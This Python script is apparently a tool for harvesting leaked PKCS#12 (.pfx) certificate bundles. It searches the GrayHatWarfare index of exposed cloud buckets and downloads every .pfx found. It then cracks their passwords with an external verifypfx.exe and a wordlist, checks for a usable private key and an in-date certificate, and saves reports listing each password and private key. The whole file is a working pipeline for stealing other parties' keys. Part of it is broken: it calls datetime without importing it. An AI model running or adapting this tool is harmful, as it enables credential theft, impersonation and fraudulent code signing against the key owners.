import hashlib
import os
import shutil
import requests
import json
import threading
import subprocess

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.serialization.pkcs12 import load_key_and_certificates

cracked_hashes = []
verified_hashes = []


def run_verifypfx_on_file(filepath, verifypfx_path, common_roots_file):
    print(f"Attempting to crack {filepath}.")
    result = subprocess.run([verifypfx_path, filepath, common_roots_file], stdout=subprocess.PIPE, text=True)
    print(f"File {filepath} processed.")
    if result.stdout.strip():
        cracked_hashes.append((filepath, result.stdout.strip()))




def download_file(filename, url):
	"""
	Download an URL to a file
	"""
	#print("Downloading " + url + "\nSaving to\t" + filename)
	
	try:
		with open(filename, 'wb') as fout:
			response = requests.get(url, stream=True)
			response.raise_for_status()
			# Write response data to file
			for block in response.iter_content(4096):
				fout.write(block)
		print("Downloaded: " + url)
		
		return True

	except Exception as e:
		print(url + " failed download")
		os.remove(filename)
		return False

def hash_file(filename):
	"""
	This function returns the SHA-1 hash
	of the file passed into it.
	"""
	# make a hash object
	h = hashlib.sha1()

	# open file for reading in binary mode
	with open(filename, 'rb') as file:
		# loop till the end of the file
		chunk = 0
		while chunk != b'':
			# read only 1024 bytes at a time
			chunk = file.read(1024)
			h.update(chunk)

	# return the hex representation of digest
	return h.hexdigest()

class certApiSearch:
    def __init__(self):
        self.var = "1"

    def grayhatwarfare(self, api_key='', search_terms_dict={}):
        self.BASE_URL = "https://buckets.grayhatwarfare.com/api/v2/files"
        self.api_key = api_key
        self.search_terms_dict = search_terms_dict
        self.search_defaults = {
          "limit" : "1000",
          "full-path" : "0"
        }
        self.get_query = self.BASE_URL + "?"
        """
        Build get query string starting with default query items 
        """
        for key, value in self.search_defaults.items():
            self.get_query = self.get_query + key + "=" + value + "&"
        """ 
        Then add more specfic search terms
        """
        for key, value in self.search_terms_dict.items():
            self.get_query = self.get_query + key + "=" + value + "&"
        # Remove trailing &
        self.get_query = self.get_query[:-1]
        search = requests.get(self.get_query,headers = {'Authorization' : f'Bearer {api_key}'}) 
        # Load response as json object
        search_json = json.loads(search.text)
        return search_json

    def catalogue_search_for_download(self, search_json):
        self.search_json = search_json
        catalogue = {}
        for x in search_json['files']:
            if catalogue.get(x['filename']) is None:
                new_entry = {
                    x['filename'] : x['url']
                }
                catalogue.update(new_entry)
        print("Number of unique name certs = " + str(len(catalogue)))
        return catalogue



# Check cert in date
def is_certificate_indate(cert):
    current_time = datetime.utcnow()
    return cert.not_valid_before <= current_time <= cert.not_valid_after

# Check the PFX file has both a private key and at least one certificate
def check_pfx_contents(pfx_path, pfx_password):
    # Load the PFX (PKCS#12) file
    
    with open(pfx_path, 'rb') as pfx_file:
        pfx_data = pfx_file.read()
    
    if pfx_password != None:
        file_password = pfx_password.encode()
    else:
        file_password = None

    # Parse the PFX file
    try:
        private_key, certificate, additional_certificates = load_key_and_certificates(
            pfx_data, 
            file_password,
            backend=default_backend()
        )
    except:
        # debug
        print("\n\t\tREADING FALIURE")
        return False


    # Check for private key
    print(pfx_path[4:9]+':  ',private_key)
    if not private_key:
        return False
    
    # Check for main certificate
    print(pfx_path[4:9]+':  ',certificate)
    if not certificate:
        return False
    
    # Check it is in date
    print(pfx_path[4:9]+':  ', certificate.not_valid_before, certificate.not_valid_after)
    if not is_certificate_indate(certificate):
        return False
    
    with open(f"cracked_certs/{pfx_path[4:9]}_report.txt", 'w') as f:
        f.write(f"Name: {pfx_path[4:]}.pfx\nPassword: {pfx_password}\n\nPrivate Key:\n{private_key}\n\nCertificate(s):\n{certificate}\n{additional_certificates}\n\nDates:\n{certificate.not_valid_before} to {certificate.not_valid_after}")
    
    return True



def main():
    ####
    #### DOWNLOADING STAGE 
    ####
    directory = "dls/"
    # If download directory doesnt exist, create
    isExist = os.path.exists(directory)
    if not isExist:
        os.makedirs(directory)
        print("Directory " + directory + " created")
    
    isExist = os.path.exists('cracked_certs/')
    if not isExist:
        os.makedirs('cracked_certs/')
        print("Directory cracked_certs/ created")

    with open("api_key.txt", "r") as f:
        api_key = f.readlines()[0]

    search_terms_dict = {
        "extensions" : "pfx",
        "keywords" : ""
    }

    test = certApiSearch()
    search = test.grayhatwarfare(api_key, search_terms_dict)
    print("Search record limit = " + str(search['query']['limit']))
    print("Results found = " + str(search['meta']['results']))

    catalogue = test.catalogue_search_for_download(search)

    # Maintain a set to keep track of hashes
    all_hashes = set()
    # Add any files that already exist
    for (paths, names, files) in os.walk(directory):
        for file in files:
            all_hashes.add(file)

    for filename, url in catalogue.items():
        print("Should I download: " + url)
        temp_filename = directory + filename
        download_result = download_file(temp_filename, url)
        
        if download_result:
            file_hash = hash_file(temp_filename)
            
            if file_hash in all_hashes:
                # This is a duplicate file, so remove it
                os.remove(temp_filename)
                print(f"Removed duplicate file: {temp_filename}")
            else:
                all_hashes.add(file_hash)
                # Rename the file to its hash
                new_filename = directory + file_hash
                os.rename(temp_filename, new_filename)
                print(f"Renamed {temp_filename} to {new_filename}")
    ### 
    ### CRACKING STAGE 
    ###
    verifypfx_path = "./verifypfx.exe"
    common_roots_file = "./common_roots.txt"

    # Start 2 threads
    threads = []
    for hash_name in all_hashes:
        thread = threading.Thread(target=run_verifypfx_on_file, args=(directory+hash_name, verifypfx_path, common_roots_file))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print(f"All tasks completed.\n\nCracked Hashes ({len(cracked_hashes)}):\n\tName\t\t\t\t\t\tPassword")
    for item in cracked_hashes:
        print('\n', item[0], '\t', item[1])
    print('\n\n')

    ### 
    ### Verification stage
    ###
    for item in cracked_hashes:
        file_hash = item[0]
        if item[1] == 'PKCS12 has no password.':
            pfx_password=None
        else:
            pfx_password = item[1]
        if check_pfx_contents(file_hash, pfx_password):
            print(f'{file_hash} is GOOD!\n')
            verified_hashes.append((file_hash, item[1]))
            shutil.copy(file_hash, 'cracked_certs/'+file_hash[4:]+'.pfx')
        else:
            print(f'{file_hash} is BAD!\n')

    print(f"\n\nVerified Hashes ({len(verified_hashes)}):\n\tName\t\t\t\t\t\tPassword")
    for item in verified_hashes:
        print('\n', item[0], '\t', item[1])


    print(f"\n{len(cracked_hashes)} ====>>> {len(verified_hashes)}\n")


### MAIN ### 
if __name__ == '__main__':
	main()
